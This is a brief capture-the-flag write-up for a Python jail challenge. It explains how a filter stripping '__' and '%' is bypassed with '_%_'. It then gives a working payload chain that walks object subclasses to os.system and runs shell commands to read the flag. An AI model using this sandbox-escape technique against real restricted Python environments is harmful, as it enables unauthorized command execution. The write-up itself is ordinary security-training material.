#incognito CTF 2022

##pyjail 1

a python jail challenge which was filtering ```__``` so we couldn't call ```__builtins__``` or etc.
after some fuzzing I found that ```%``` is also filtered. so there was an idea for me


in fuzzing part I got that ```__``` will be replaced with nothing, ```%``` also replaced with nothing.
THE IDEA =>  what if we write ```_%_```.    YES , ```%``` would be replaced with nothing and now we have ```__```
so let's write our payload.


1) List all classes which are running in this python system by using this command. ```''._%_class_%_._%_mro_%_[1]._%_subclasses_%_()```.
2) Find the index of ```<class 'os._wrap_close'>``` in this case the index of ```<class 'os._wrap_close'>``` is 138.
3) Call the system module in ```__globals__``` to list files and directories by using this command ```''._%_class_%_._%_mro_%_[1]._%_subclasses_%_()[138]._%_init_%_._%_globals_%_['system']('ls')```.
4) Show the flag string from ```jail1``` by using this command ```''._%_class_%_._%_mro_%_[1]._%_subclasses_%_()[138]._%_init_%_._%_globals_%_['system']('cat jail1')```.

## we got the flag

```ictf{REDACTED}```



there were 2 more pyjail challenges which we solved all of them.
